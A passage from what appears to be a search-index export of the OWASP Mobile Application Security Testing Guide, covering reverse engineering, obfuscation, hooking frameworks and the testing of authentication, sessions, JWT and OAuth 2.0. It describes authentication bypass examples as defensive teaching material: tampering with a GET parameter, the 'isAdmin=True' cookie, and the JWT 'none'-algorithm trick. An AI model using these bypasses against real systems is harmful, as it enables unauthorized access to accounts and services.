rootkit-like defensive mechanisms often found in Windows software (e.g., DRM systems) is simply not feasible. The openness of Android allows reverse engineers to make favorable changes to the operating system, aiding the reverse engineering process. iOS gives reverse engineers less control, but defensive options are also more limited.</p> <p>The bad news is that dealing with multi-threaded anti-debugging controls, cryptographic white-boxes, stealthy anti-tampering features, and highly complex control flow transformations is not for the faint-hearted. The most effective software protection schemes are proprietary and won't be beaten with standard tweaks and tricks. Defeating them requires tedious manual analysis, coding, frustration and, depending on your personality, sleepless nights and strained relationships.</p> <p>It's easy for beginners to get overwhelmed by the sheer scope of reversing. The best way to get started is to set up some basic tools (see the relevant sections in the Android and iOS reversing chapters) and start with simple reversing tasks and crackmes. You'll need to learn about the assembler/bytecode language, the operating system, obfuscations you encounter, and so on. Start with simple tasks and gradually level up to more difficult ones.</p> <p>In the following section, we'll give an overview of the techniques most commonly used in mobile app security testing. In later chapters, we'll drill down into OS-specific details of both Android and iOS.</p>","tags":["all","MASVS-RESILIENCE"]},{"location":"MASTG/0x04c-Tampering-and-Reverse-Engineering/#basic-tampering-techniques","title":"Basic Tampering Techniques","text":"","tags":["all","MASVS-RESILIENCE"]},{"location":"MASTG/0x04c-Tampering-and-Reverse-Engineering/#binary-patching","title":"Binary Patching","text":"<p>Patching is the process of changing the compiled app, e.g., changing code in binary executables, modifying Java bytecode, or tampering with resources. This process is known as modding in the mobile game hacking scene. Patches can be applied in many ways, including editing binary files in a hex editor and decompiling, editing, and re-assembling an app. We'll give detailed examples of useful patches in later chapters.</p> <p>Keep in mind that modern mobile operating systems strictly enforce code signing, so running modified apps is not as straightforward as it used to be in desktop environments. Security experts had a much easier life in the 90s! Fortunately, patching is not very difficult if you work on your own device. You simply have to re-sign the app or disable the default code signature verification facilities to run modified code.</p>","tags":["all","MASVS-RESILIENCE"]},{"location":"MASTG/0x04c-Tampering-and-Reverse-Engineering/#code-injection","title":"Code Injection","text":"<p>Code injection is a very powerful technique that allows you to explore and modify processes at runtime. Injection can be implemented in various ways, but you'll get by without knowing all the details thanks to freely available, well-documented tools that automate the process. These tools give you direct access to process memory and important structures such as live objects instantiated by the app. They come with many utility functions that are useful for resolving loaded libraries, hooking methods and native functions, and more. Process memory tampering is more difficult to detect than file patching, so it is the preferred method in most cases.</p> <p> ElleKit,  Frida, and  Xposed are the most widely used hooking and code injection frameworks in the mobile industry. The three frameworks differ in design philosophy and implementation details: ElleKit and Xposed focus on code injection and/or hooking, while Frida aims to be a full-blown \"dynamic instrumentation framework\", incorporating code injection, language bindings, and an injectable JavaScript VM and console.</p> <p>We'll include examples of all three frameworks. We recommend starting with Frida because it is the most versatile of the three (for this reason, we'll also include more Frida details and examples). Notably, Frida can inject a JavaScript VM into a process on both Android and iOS, while injection with ElleKit only works on iOS and Xposed only works on Android. Ultimately, however, you can of course achieve many of the same goals with either framework.</p>","tags":["all","MASVS-RESILIENCE"]},{"location":"MASTG/0x04c-Tampering-and-Reverse-Engineering/#static-and-dynamic-binary-analysis","title":"Static and Dynamic Binary Analysis","text":"<p>Reverse engineering is the process of reconstructing the semantics of a compiled program's source code. In other words, you take the program apart, run it, simulate parts of it, and do other unspeakable things to it to understand what it does and how.</p>","tags":["all","MASVS-RESILIENCE"]},{"location":"MASTG/0x04c-Tampering-and-Reverse-Engineering/#using-disassemblers-and-decompilers","title":"Using Disassemblers and Decompilers","text":"<p>Disassemblers and decompilers allow you to translate an app's binary code or bytecode back into a more or less understandable format. By using these tools on native binaries, you can obtain assembler code that matches the architecture the app was compiled for. Disassemblers convert machine code to assembly code which in turn is used by decompilers to generate equivalent high-level language code. Android Java apps can be disassembled to smali, which is an assembly language for the DEX format used by Dalvik, Android's Java VM. Smali assembly can also be quite easily decompiled back to equivalent Java code.</p> <p>In theory, the mapping between assembly and machine code should be one-to-one, and therefore it may give the impression that disassembling is a simple task. But in practice, there are multiple pitfalls such as:</p> <ul> <li>Reliable distinction between code and data.</li> <li>Variable instruction size.</li> <li>Indirect branch instructions.</li> <li>Functions without explicit CALL instructions within the executable's code segment.</li> <li>Position independent code (PIC) sequences.</li> <li>Hand crafted assembly code.</li> </ul> <p>Similarly, decompilation is a very complicated process, involving many deterministic and heuristic based approaches. As a consequence, decompilation is usually not really accurate, but nevertheless very helpful in getting a quick understanding of the function being analyzed. The accuracy of decompilation depends on the amount of information available in the code being decompiled and the sophistication of the decompiler. In addition, many compilation and post-compilation tools introduce additional complexity to the compiled code in order to increase the difficulty of comprehension and/or even decompilation itself. Such code referred to as obfuscated code.</p> <p>Over the past decades many tools have perfected the process of disassembly and decompilation, producing output with high fidelity. Advanced usage instructions for any of the available tools can often easily fill a book of their own. The best way to get started is to simply pick up a tool that fits your needs and budget and get a well-reviewed user guide. In this section, we will provide an introduction to some of those tools and in the subsequent \"Reverse Engineering and Tampering\" Android and iOS chapters we'll focus on the techniques themselves, especially those that are specific to the platform at hand.</p>","tags":["all","MASVS-RESILIENCE"]},{"location":"MASTG/0x04c-Tampering-and-Reverse-Engineering/#obfuscation","title":"Obfuscation","text":"<p>Obfuscation is the process of transforming code and data to make it more difficult to comprehend (and sometimes even difficult to disassemble). It is usually an integral part of the software protection scheme. Obfuscation isn't something that can be simply turned on or off, programs can be made incomprehensible, in whole or in part, in many ways and to different degrees.</p> <p>Note: All presented techniques below will not stop someone with enough time and budget from reverse engineering your app. However, combining these techniques will make their job significantly harder. The aim is thus to discourage reverse engineers from performing further analysis and not making it worth the effort.</p> <p>The following techniques can be used to obfuscate an application:</p> <ul> <li>Name obfuscation</li> <li>Instruction substitution</li> <li>Control flow flattening</li> <li>Dead code injection</li> <li>String encryption</li> <li>Packing</li> </ul>","tags":["all","MASVS-RESILIENCE"]},{"location":"MASTG/0x04c-Tampering-and-Reverse-Engineering/#name-obfuscation","title":"Name Obfuscation","text":"<p>The standard compiler generates binary symbols based on class and function names from the source code. Therefore, if no obfuscation is applied, symbol names remain meaningful and can easily be extracted from the app binary. For instance, a function which detects a jailbreak can be located by searching for relevant keywords (e.g. \"jailbreak\"). The listing below shows the disassembled function <code>JailbreakDetectionViewController.jailbreakTest4Tapped</code> from the  DVIA-v2.</p> <pre><code>__T07DVIA_v232JailbreakDetectionViewControllerC20jailbreakTest4TappedyypF:\nstp        x22, x21, [sp, #-0x30]!\nmov        rbp, rsp\n</code></pre> <p>After the obfuscation we can observe that the symbol's name is no longer meaningful as shown on the listing below.</p> <pre><code>__T07DVIA_v232zNNtWKQptikYUBNBgfFVMjSkvRdhhnbyyFySbyypF:\nstp        x22, x21, [sp, #-0x30]!\nmov        rbp, rsp\n</code></pre> <p>Nevertheless, this only applies to the names of functions, classes and fields. The actual code remains unmodified, so an attacker can still read the disassembled version of the function and try to understand its purpose (e.g. to retrieve the logic of a security algorithm).</p>","tags":["all","MASVS-RESILIENCE"]},{"location":"MASTG/0x04c-Tampering-and-Reverse-Engineering/#instruction-substitution","title":"Instruction Substitution","text":"<p>This technique replaces standard binary operators like addition or subtraction with more complex representations. For example, an addition <code>x = a + b</code> can be represented as <code>x = -(-a) - (-b)</code>. However, using the same replacement representation could be easily reversed, so it is recommended to add multiple substitution techniques for a single case and introduce a random factor. This technique can be reversed during decompilation, but depending on the complexity and depth of the substitutions, reversing it can still be time consuming.</p>","tags":["all","MASVS-RESILIENCE"]},{"location":"MASTG/0x04c-Tampering-and-Reverse-Engineering/#control-flow-flattening","title":"Control Flow Flattening","text":"<p>Control flow flattening replaces original code with a more complex representation. The transformation breaks the body of a function into basic blocks and puts them all inside a single infinite loop with a switch statement that controls the program flow. This makes the program flow significantly harder to follow because it removes the natural conditional constructs that usually make the code easier to read.</p> <p></p> <p>The image shows how control flow flattening alters code. See \"Obfuscating C++ programs via control flow flattening\" for more information.</p>","tags":["all","MASVS-RESILIENCE"]},{"location":"MASTG/0x04c-Tampering-and-Reverse-Engineering/#dead-code-injection","title":"Dead Code Injection","text":"<p>This technique makes the program's control flow more complex by injecting dead code into the program. Dead code is a stub of code that doesn't affect the original program's behavior but increases the overhead of the reverse engineering process.</p>","tags":["all","MASVS-RESILIENCE"]},{"location":"MASTG/0x04c-Tampering-and-Reverse-Engineering/#string-encryption","title":"String Encryption","text":"<p>Applications are often compiled with hardcoded keys, licences, tokens and endpoint URLs. By default, all of them are stored in plaintext in the data section of an application's binary. This technique encrypts these values and injects stubs of code into the program that will decrypt that data before it is used by the program.</p>","tags":["all","MASVS-RESILIENCE"]},{"location":"MASTG/0x04c-Tampering-and-Reverse-Engineering/#packing","title":"Packing","text":"<p>Packing is a dynamic rewriting obfuscation technique which compresses or encrypts the original executable into data and dynamically recovers it during execution. Packing an executable changes the file signature in an attempt to avoid signature-based detection.</p>","tags":["all","MASVS-RESILIENCE"]},{"location":"MASTG/0x04c-Tampering-and-Reverse-Engineering/#debugging-and-tracing","title":"Debugging and Tracing","text":"<p>In the traditional sense, debugging is the process of identifying and isolating problems in a program as part of the software development life cycle. The same tools used for debugging are valuable to reverse engineers even when identifying bugs is not the primary goal. Debuggers enable program suspension at any point during runtime, inspection of the process' internal state, and even register and memory modification. These abilities simplify program inspection.</p> <p>Debugging usually means interactive debugging sessions in which a debugger is attached to the running process. In contrast, tracing refers to passive logging of information about the app's execution (such as API calls). Tracing can be done in several ways, including debugging APIs, function hooks, and Kernel tracing facilities. Again, we'll cover many of these techniques in the OS-specific \"Reverse Engineering and Tampering\" chapters.</p>","tags":["all","MASVS-RESILIENCE"]},{"location":"MASTG/0x04c-Tampering-and-Reverse-Engineering/#advanced-techniques","title":"Advanced Techniques","text":"<p>For more complicated tasks, such as de-obfuscating heavily obfuscated binaries, you won't get far without automating certain parts of the analysis. For example, understanding and simplifying a complex control flow graph based on manual analysis in the disassembler would take you years (and most likely drive you mad long before you're done). Instead, you can augment your workflow with custom made tools. Fortunately, modern disassemblers come with scripting and extension APIs, and many useful extensions are available for popular disassemblers. There are also open source disassembling engines and binary analysis frameworks.</p> <p>As always in hacking, the anything-goes rule applies: simply use whatever is most efficient. Every binary is different, and all reverse engineers have their own style. Often, the best way to achieve your goal is to combine approaches (such as emulator-based tracing and symbolic execution). To get started, pick a good disassembler and/or reverse engineering framework, then get comfortable with their particular features and extension APIs. Ultimately, the best way to get better is to get hands-on experience.</p>","tags":["all","MASVS-RESILIENCE"]},{"location":"MASTG/0x04c-Tampering-and-Reverse-Engineering/#dynamic-binary-instrumentation","title":"Dynamic Binary Instrumentation","text":"<p>Another useful approach for native binaries is dynamic binary instrumentations (DBI). Instrumentation frameworks such as Valgrind and PIN support fine-grained instruction-level tracing of single processes. This is accomplished by inserting dynamically generated code at runtime. Valgrind compiles fine on Android, and pre-built binaries are available for download.</p> <p>The Valgrind README includes specific compilation instructions for Android.</p>","tags":["all","MASVS-RESILIENCE"]},{"location":"MASTG/0x04c-Tampering-and-Reverse-Engineering/#emulation-based-dynamic-analysis","title":"Emulation-based Dynamic Analysis","text":"<p>Emulation is an imitation of a certain computer platform or program being executed in different platform or within another program. The software or hardware performing this imitation is called an emulator. Emulators provide a much cheaper alternative to an actual device, where a user can manipulate it without worrying about damaging the device. There are multiple emulators available for Android, but for iOS there are practically no viable emulators available. iOS only has a simulator, shipped within Xcode.</p> <p>The difference between a simulator and an emulator often causes confusion and leads to use of the two terms interchangeably, but in reality they are different, specially for the iOS use case. An emulator mimics both the software and hardware environment of a targeted platform. On the other hand, a simulator only mimics the software environment.</p> <p>QEMU based emulators for Android take into consideration the RAM, CPU, battery performance etc (hardware components) while running an application, but in an iOS simulator this hardware component behaviour is not taken into consideration at all. The iOS simulator even lacks the implementation of the iOS kernel, as a result if an application is using syscalls it cannot be executed in this simulator.</p> <p>In simple words, an emulator is a much closer imitation of the targeted platform, while a simulator mimics only a part of it.</p> <p>Running an app in the emulator gives you powerful ways to monitor and manipulate its environment. For some reverse engineering tasks, especially those that require low-level instruction tracing, emulation is the best (or only) choice. Unfortunately, this type of analysis is only viable for Android, because no free or open source emulator exists for iOS (the iOS simulator is not an emulator, and apps compiled for an iOS device don't run on it). The only iOS emulator available is a commercial SaaS solution -  Corellium.</p>","tags":["all","MASVS-RESILIENCE"]},{"location":"MASTG/0x04c-Tampering-and-Reverse-Engineering/#custom-tooling-with-reverse-engineering-frameworks","title":"Custom Tooling with Reverse Engineering Frameworks","text":"<p>Even though most professional GUI-based disassemblers feature scripting facilities and extensibility, they are simply not well-suited to solving particular problems. Reverse engineering frameworks allow you to perform and automate any kind of reversing task without depending on a heavy-weight GUI. Notably, most reversing frameworks are open source and/or available for free. Popular frameworks with support for mobile architectures include  radare2 for iOS and  Angr.</p>","tags":["all","MASVS-RESILIENCE"]},{"location":"MASTG/0x04c-Tampering-and-Reverse-Engineering/#example-program-analysis-with-symbolicconcolic-execution","title":"Example: Program Analysis with Symbolic/Concolic Execution","text":"<p>In the late 2000s, testing based on symbolic execution has become a popular way to identify security vulnerabilities. Symbolic \"execution\" actually refers to the process of representing possible paths through a program as formulas in first-order logic. Satisfiability Modulo Theories (SMT) solvers are used to check the satisfiability of these formulas and provide solutions, including concrete values of the variables needed to reach a certain point of execution on the path corresponding to the solved formula.</p> <p>In simple words, symbolic execution is mathematically analyzing a program without executing it. During analysis, each unknown input is represented as a mathematical variable (a symbolic value), and hence all the operations performed on these variables are recorded as a tree of operations (aka. AST (abstract syntax tree), from compiler theory). These ASTs can be translated into so-called constraints that will be interpreted by a SMT solver. In the end of this analysis, a final mathematical equation is obtained, in which the variables are the inputs whose values are not known. SMT solvers are special programs which solve these equations to give possible values for the input variables given a final state.</p> <p>To illustrate this, imagine a function which takes one input (<code>x</code>) and multiplies it by the value of a second input (<code>y</code>). Finally, there is an if condition which checks if the value calculated is greater than the value of an external variable(<code>z</code>), and returns \"success\" if true, else returns \"fail\". The equation for this operation will be <code>(x * y) &gt; z</code>.</p> <p>If we want the function to always return \"success\" (final state), we can tell the SMT solver to calculate the values for <code>x</code> and <code>y</code> (input variables) which satisfy the corresponding equation. As is the case for global variables, their value can be changed from outside this function, which may lead to different outputs whenever this function is executed. This adds to additional complexity in determining correct solution.</p> <p>Internally SMT solvers use various equation solving techniques to generate solution for such equations. Some of the techniques are very advanced and their discussion is beyond the scope of this book.</p> <p>In a real world situation, the functions are much more complex than the above example. The increased complexity of the functions can pose significant challenges for classical symbolic execution. Some of the challenges are summarised below:</p> <ul> <li>Loops and recursions in a program may lead to infinite execution tree.</li> <li>Multiple conditional branches or nested conditions may lead to path explosion.</li> <li>Complex equations generated by symbolic execution may not be solvable by SMT solvers because of their limitations.</li> <li>Program is using system calls, library calls or network events which cannot be handled by symbolic execution.</li> </ul> <p>To overcome these challenges, typically, symbolic execution is combined with other techniques such as dynamic execution (also called concrete execution) to mitigate the path explosion problem specific to classical symbolic execution. This combination of concrete (actual) and symbolic execution is referred to as concolic execution (the name concolic stems from concrete and symbolic), sometimes also called as dynamic symbolic execution.</p> <p>To visualize this, in the above example, we can obtain the value of the external variable by performing further reverse engineering or by dynamically executing the program and feeding this information into our symbolic execution analysis. This extra information will reduce the complexity of our equations and may produce more accurate analysis results. Together with improved SMT solvers and current hardware speeds, concolic execution allows to explore paths in medium-size software modules (i.e., on the order of 10 KLOC).</p> <p>In addition, symbolic execution also comes in handy for supporting de-obfuscation tasks, such as simplifying control flow graphs. For example, Jonathan Salwan and Romain Thomas have shown how to reverse engineer VM-based software protections using Dynamic Symbolic Execution [#salwan] (i.e., using a mix of actual execution traces, simulation, and symbolic execution).</p> <p>In the Android section, you'll find a walkthrough for cracking a simple license check in an Android application using symbolic execution.</p>","tags":["all","MASVS-RESILIENCE"]},{"location":"MASTG/0x04c-Tampering-and-Reverse-Engineering/#references","title":"References","text":"<ul> <li>[#vadla] Ole Andr\u00e9 Vadla Ravn\u00e5s, Anatomy of a code tracer - https://medium.com/@oleavr/anatomy-of-a-code-tracer-b081aadb0df8</li> <li>[#salwan] Jonathan Salwan and Romain Thomas, How Triton can help to reverse virtual machine based software protections - https://drive.google.com/file/d/1EzuddBA61jEMy8XbjQKFF3jyoKwW7tLq/view?usp=sharing</li> </ul>","tags":["all","MASVS-RESILIENCE"]},{"location":"MASTG/0x04e-Testing-Authentication-and-Session-Management/","title":"Mobile App Authentication Architectures","text":"<p>Authentication and authorization problems are prevalent security vulnerabilities. In fact, they consistently rank second highest in the OWASP Top 10.</p> <p>Most mobile apps implement some kind of user authentication. Even though part of the authentication and state management logic is performed by the backend service, authentication is such an integral part of most mobile app architectures that understanding its common implementations is important.</p> <p>Since the basic concepts are identical on iOS and Android, we'll discuss prevalent authentication and authorization architectures and pitfalls in this generic guide. OS-specific authentication issues, such as local and biometric authentication, will be discussed in the respective OS-specific chapters.</p>","tags":["all","MASVS-AUTH"]},{"location":"MASTG/0x04e-Testing-Authentication-and-Session-Management/#general-assumptions","title":"General Assumptions","text":"","tags":["all","MASVS-AUTH"]},{"location":"MASTG/0x04e-Testing-Authentication-and-Session-Management/#appropriate-authentication-is-in-place","title":"Appropriate Authentication is in Place","text":"<p>Perform the following steps when testing authentication and authorization:</p> <ul> <li>Identify the additional authentication factors the app uses.</li> <li>Locate all endpoints that provide critical functionality.</li> <li>Verify that the additional factors are strictly enforced on all server-side endpoints.</li> </ul> <p>Authentication bypass vulnerabilities exist when authentication state is not consistently enforced on the server and when the client can tamper with the state. While the backend service is processing requests from the mobile client, it must consistently enforce authorization checks: verifying that the user is logged in and authorized every time a resource is requested.</p> <p>Consider the following example from the OWASP Web Testing Guide. In the example, a web resource is accessed through a URL, and the authentication state is passed through a GET parameter:</p> <pre><code>http://www.site.com/page.asp?authenticated=no\n</code></pre> <p>The client can arbitrarily change the GET parameters sent with the request. Nothing prevents the client from simply changing the value of the <code>authenticated</code> parameter to \"yes\", effectively bypassing authentication.</p> <p>Although this is a simplistic example that you probably won't find in the wild, programmers sometimes rely on \"hidden\" client-side parameters, such as cookies, to maintain authentication state. They assume that these parameters can't be tampered with. Consider, for example, the following classic vulnerability in Nortel Contact Center Manager. The administrative web application of Nortel's appliance relied on the cookie \"isAdmin\" to determine whether the logged-in user should be granted administrative privileges. Consequently, it was possible to get admin access by simply setting the cookie value as follows:</p> <pre><code>isAdmin=True\n</code></pre> <p>Security experts used to recommend using session-based authentication and maintaining session data on the server only. This prevents any form of client-side tampering with the session state. However, the whole point of using stateless authentication instead of session-based authentication is to not have session state on the server. Instead, state is stored in client-side tokens and transmitted with every request. In this case, seeing client-side parameters such as <code>isAdmin</code> is perfectly normal.</p> <p>To prevent tampering cryptographic signatures are added to client-side tokens. Of course, things may go wrong, and popular implementations of stateless authentication have been vulnerable to attacks. For example, the signature verification of some JSON Web Token (JWT) implementations could be deactivated by setting the signature type to \"None\".</p>","tags":["all","MASVS-AUTH"]},{"location":"MASTG/0x04e-Testing-Authentication-and-Session-Management/#best-practices-for-passwords","title":"Best Practices for Passwords","text":"<p>Password strength is a key concern when passwords are used for authentication. The password policy defines requirements to which end users should adhere. A password policy typically specifies password length, password complexity, and password topologies. A \"strong\" password policy makes manual or automated password cracking difficult or impossible. For further information please consult the OWASP Authentication Cheat Sheet.</p>","tags":["all","MASVS-AUTH"]},{"location":"MASTG/0x04e-Testing-Authentication-and-Session-Management/#general-guidelines-on-testing-authentication","title":"General Guidelines on Testing Authentication","text":"<p>There's no one-size-fits-all approach to authentication. When reviewing the authentication architecture of an app, you should first consider whether the authentication method(s) used are appropriate in the given context. Authentication can be based on one or more of the following:</p> <ul> <li>Something the user knows (password, PIN, pattern, etc.)</li> <li>Something the user has (SIM card, one-time password generator, or hardware token)</li> <li>A biometric property of the user (fingerprint, retina, voice)</li> </ul> <p>The number of authentication procedures implemented by mobile apps depends on the sensitivity of the functions or accessed resources. Refer to industry best practices when reviewing authentication functions. Username/password authentication (combined with a reasonable password policy) is generally considered sufficient for apps that have a user login and aren't very sensitive. This form of authentication is used by most social media apps.</p> <p>For sensitive apps, adding a second authentication factor is usually appropriate. This includes apps that provide access to very sensitive information (such as credit card numbers) or allow users to transfer funds. In some industries, these apps must also comply with certain standards. For example, financial apps have to ensure compliance with the Payment Card Industry Data Security Standard (PCI DSS), the Gramm Leach Bliley Act, and the Sarbanes-Oxley Act (SOX). Compliance considerations for the US health care sector include the Health Insurance Portability and Accountability Act (HIPAA) and the Patient Safety Rule.</p>","tags":["all","MASVS-AUTH"]},{"location":"MASTG/0x04e-Testing-Authentication-and-Session-Management/#stateful-vs-stateless-authentication","title":"Stateful vs. Stateless Authentication","text":"<p>You'll usually find that the mobile app uses HTTP as the transport layer. The HTTP protocol itself is stateless, so there must be a way to associate a user's subsequent HTTP requests with that user. Otherwise, the user's log in credentials would have to be sent with every request. Also, both the server and client need to keep track of user data (e.g., the user's privileges or role). This can be done in two different ways:</p> <ul> <li> <p>With stateful authentication, a unique session id is generated when the user logs in. In subsequent requests, this session ID serves as a reference to the user details stored on the server. The session ID is opaque; it doesn't contain any user data.</p> </li> <li> <p>With stateless authentication, all user-identifying information is stored in a client-side token. The token can be passed to any server or micro service, eliminating the need to maintain session state on the server. Stateless authentication is often factored out to an authorization server, which produces, signs, and optionally encrypts the token upon user login.</p> </li> </ul> <p>Web applications commonly use stateful authentication with a random session ID that is stored in a client-side cookie. Although mobile apps sometimes use stateful sessions in a similar fashion, stateless token-based approaches are becoming popular for a variety of reasons:</p> <ul> <li>They improve scalability and performance by eliminating the need to store session state on the server.</li> <li>Tokens enable developers to decouple authentication from the app. Tokens can be generated by an authentication server, and the authentication scheme can be changed seamlessly.</li> </ul> <p>As a mobile security tester, you should be familiar with both types of authentication.</p>","tags":["all","MASVS-AUTH"]},{"location":"MASTG/0x04e-Testing-Authentication-and-Session-Management/#stateful-authentication","title":"Stateful Authentication","text":"<p>Stateful (or \"session-based\") authentication is characterized by authentication records on both the client and server. The authentication flow is as follows:</p> <ol> <li>The app sends a request with the user's credentials to the backend server.</li> <li>The server verifies the credentials. If the credentials are valid, the server creates a new session along with a random session ID.</li> <li>The server sends to the client a response that includes the session ID.</li> <li>The client sends the session ID with all subsequent requests. The server validates the session ID and retrieves the associated session record.</li> <li>After the user logs out, the server-side session record is destroyed and the client discards the session ID.</li> </ol> <p>When sessions are improperly managed, they are vulnerable to a variety of attacks that may compromise the session of a legitimate user, allowing the attacker to impersonate the user. This may result in lost data, compromised confidentiality, and illegitimate actions.</p> <p>Best Practices:</p> <p>Locate any server-side endpoints that provide sensitive information or functions and verify the consistent enforcement of authorization. The backend service must verify the user's session ID or token and make sure that the user has sufficient privileges to access the resource. If the session ID or token is missing or invalid, the request must be rejected.</p> <p>Make sure that:</p> <ul> <li>Session IDs are randomly generated on the server side.</li> <li>The IDs can't be guessed easily (use proper length and entropy).</li> <li>Session IDs are always exchanged over secure connections (e.g. HTTPS).</li> <li>The mobile app doesn't save session IDs in permanent storage.</li> <li>The server verifies the session whenever a user tries to access privileged application elements (a session ID must be valid and must correspond to the proper authorization level).</li> <li>The session is terminated on the server side and session information deleted within the mobile app after it times out or the user logs out.</li> </ul> <p>Authentication shouldn't be implemented from scratch but built on top of proven frameworks. Many popular frameworks provide ready-made authentication and session management functionality. If the app uses framework APIs for authentication, check the framework security documentation for best practices. Security guides for common frameworks are available at the following links:</p> <ul> <li>Spring (Java)</li> <li>Struts (Java)</li> <li>Laravel (PHP)</li> <li>Ruby on Rails</li> <li>ASP.Net</li> </ul> <p>A great resource for testing server-side authentication is the OWASP Web Testing Guide, specifically the Testing Authentication and Testing Session Management chapters.</p>","tags":["all","MASVS-AUTH"]},{"location":"MASTG/0x04e-Testing-Authentication-and-Session-Management/#stateless-authentication","title":"Stateless Authentication","text":"<p>Token-based authentication is implemented by sending a signed token (verified by the server) with each HTTP request. The most commonly used token format is the JSON Web Token, defined in RFC7519. A JWT may encode the complete session state as a JSON object. Therefore, the server doesn't have to store any session data or authentication information.</p> <p>JWT tokens consist of three Base64Url-encoded parts separated by dots. The Token structure is as follows:</p> <pre><code>base64UrlEncode(header).base64UrlEncode(payload).base64UrlEncode(signature)\n</code></pre> <p>The following example shows a Base64Url-encoded JSON Web Token:</p> <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ikpva\nG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ\n</code></pre> <p>The header typically consists of two parts: the token type, which is JWT, and the hashing algorithm being used to compute the signature. In the example above, the header decodes as follows:</p> <pre><code>{\"alg\":\"HS256\",\"typ\":\"JWT\"}\n</code></pre> <p>The second part of the token is the payload, which contains so-called claims. Claims are statements about an entity (typically, the user) and additional metadata. For example:</p> <pre><code>{\"sub\":\"1234567890\",\"name\":\"John Doe\",\"admin\":true}\n</code></pre> <p>The signature is created by applying the algorithm specified in the JWT header to the encoded header, encoded payload, and a secret value. For example, when using the HMAC SHA256 algorithm the signature is created in the following way:</p> <pre><code>HMACSHA256(base64UrlEncode(header) + \".\" + base64UrlEncode(payload), secret)\n</code></pre> <p>Note that the secret is shared between the authentication server and the backend service - the client does not know it. This proves that the token was obtained from a legitimate authentication service. It also prevents the client from tampering with the claims contained in the token.</p> <p>Best Practices:</p> <p>Verify that the implementation adheres to JWT best practices:</p> <ul> <li>Verify that the HMAC is checked for all incoming requests containing a token.</li> <li>Verify that the private signing key or HMAC secret key is never shared with the client. It should be available for the issuer and verifier only.</li> <li>Verify that no sensitive data, such as personal identifiable information, is embedded in the JWT. For example, by decoding the base64-encoded JWT and find out what kind of data it transmits and whether that data is encrypted. If, for some reason, the architecture requires transmission of such information in the token, make sure that payload encryption is being applied.</li> <li>Make sure that replay attacks are addressed with the <code>jti</code> (JWT ID) claim, which gives the JWT a unique identifier.</li> <li>Make sure that cross service relay attacks are addressed with the <code>aud</code> (audience) claim, which defines for which application the token is entitled.</li> <li>Verify that tokens are stored securely on the mobile phone, with, for example, KeyChain (iOS) or KeyStore (Android).</li> <li>Verify that the hashing algorithm is enforced. A common attack includes altering the token to use an empty signature (e.g., signature = \"\") and set the signing algorithm to <code>none</code>, indicating that \"the integrity of the token has already been verified\". Some libraries might treat tokens signed with the <code>none</code> algorithm as if they were valid tokens with verified signatures, so the application will trust altered token claims.</li> <li>Verify that tokens include an \"exp\" expiration claim and the backend doesn't process expired tokens. A common method of granting tokens combines access tokens and refresh tokens. When the user logs in, the backend service issues a short-lived access token and a long-lived refresh token. The application can then use the refresh token to obtain a new access token, if the access token expires.</li> </ul> <p>There are two different Burp Plugins that can help you for testing the vulnerabilities listed above:</p> <ul> <li>JSON Web Token Attacker</li> <li>JSON Web Tokens</li> </ul> <p>Also, make sure to check out the OWASP JWT Cheat Sheet for additional information.</p>","tags":["all","MASVS-AUTH"]},{"location":"MASTG/0x04e-Testing-Authentication-and-Session-Management/#oauth-20","title":"OAuth 2.0","text":"<p>OAuth 2.0 is an authorization framework that enables third-party applications to obtain limited access to user accounts on remote HTTP services such as APIs and web-enabled applications.</p> <p>Common uses for OAuth2 include:</p> <ul> <li>Getting permission from the user to access an online service using their account.</li> <li>Authenticating to an online service on behalf of the user.</li> <li>Handling authentication errors.</li> </ul> <p>According to OAuth 2.0, a mobile client seeking access to a user's resources must first ask the user to authenticate against an authentication server. With the users' approval, the authorization server then issues a token that allows the app to act on behalf of the user. Note that the OAuth2 specification doesn't define any particular kind of authentication or access token format.</p>","tags":["all","MASVS-AUTH"]},{"location":"MASTG/0x04e-Testing-Authentication-and-Session-Management/#protocol-overview","title":"Protocol Overview","text":"<p>OAuth 2.0 defines four roles:</p> <ul> <li>Resource Owner: the account owner</li> <li>Client: the application that wants to access the user's account with the access tokens</li> <li>Resource Server: hosts the user accounts</li> <li>Authorization Server: verifies user identity and issues access tokens to the application</li> </ul> <p>Note: The API fulfills both the Resource Server and Authorization Server roles. Therefore, we will refer to both as the API.</p> <p></p> <p>Here is a more detailed explanation of the steps in the diagram:</p> <ol> <li>The application requests user authorization to access service resources.</li> <li>If the user authorizes the request, the application receives an authorization grant. The authorization grant may take several forms (explicit, implicit, etc.).</li> <li>The application requests an access token from the authorization server (API) by presenting authentication of its own identity along with the authorization grant.</li> <li>If the application identity is authenticated and the authorization grant is valid, the authorization server (API) issues an access token to the application, completing the authorization process. The access token may have a companion refresh token.</li> <li>The application requests the resource from the resource server (API) and presents the access token for authentication. The access token may be used in several ways (e.g., as a bearer token).</li> <li>If the access token is valid, the resource server (API) serves the resource to the application.</li> </ol> <p>In OAuth2, the user agent is the entity that performs the authentication. OAuth2 authentication can be performed either through an external user agent (e.g. Chrome or Safari) or in the app itself (e.g. through a WebView embedded into the app or an authentication library). None of the two modes is intrinsically \"better\" than the other. The choice depends on the app's specific use case and threat model.</p> <p>External User Agent: Using an external user agent is the method of choice for apps that need to interact with social media accounts (Facebook, Twitter, etc.). Advantages of this method include:</p> <ul> <li>The user's credentials are never directly exposed to the app. This guarantees that the app cannot obtain the credentials during the login process (\"credential phishing\").</li> <li>Almost no authentication logic must be added to the app itself, preventing coding errors.</li> </ul> <p>On the negative side, there is no way to control the behavior of the browser (e.g. to activate certificate pinning).</p> <p>Embedded User Agent: Using an embedded user agent is the method of choice for apps that need to operate within a closed ecosystem, for example to interact with corporate accounts. For example, consider a banking app that uses OAuth2 to retrieve an access token from the bank's authentication server, which is then used to access a number of micro services. In that case, credential phishing is not a viable scenario. It is likely preferable to keep the authentication process in the (hopefully) carefully secured banking app, instead of placing trust on external components.</p>","tags":["all","MASVS-AUTH"]},{"location":"MASTG/0x04e-Testing-Authentication-and-Session-Management/#best-practices","title":"Best Practices","text":"<p>For additional best practices and detailed information please refer to the following source documents:</p> <ul> <li>RFC6749 - The OAuth 2.0 Authorization Framework (October 2012)</li> <li>RFC8252 - OAuth 2.0 for Native Apps (October 2017)</li> <li>RFC6819 - OAuth 2.0 Threat 